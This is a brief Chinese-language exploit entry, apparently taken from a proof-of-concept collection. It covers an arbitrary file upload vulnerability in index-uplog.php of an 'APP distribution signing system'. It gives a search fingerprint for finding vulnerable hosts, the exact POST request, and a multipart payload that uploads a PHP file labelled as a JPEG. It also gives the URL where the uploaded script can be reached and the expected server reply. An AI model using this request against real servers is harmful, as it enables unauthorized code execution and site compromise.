# APP分发签名系统index-uplog.php任意文件上传漏洞

- **系统**：APP　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/api/statistics/service-usage-amount"`
- **请求**：`POST /source/pack/upload/2upload/index-uplog.php HTTP/1.1`
- **关键头**：`Content-Length: 290`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfF7NbGp0…`

**请求体 / payload**
```
------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="time"
1-2
------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="app"; filename="1.php"
Content-Type: image/jpeg
<?php phpinfo();?>
------WebKitFormBoundary03rNBzFMIytvpWhy--
文件访问地址/source/data/tmp/1-2.php
```
- **预期**：200　|　{'extension':'php','time':'1-2'}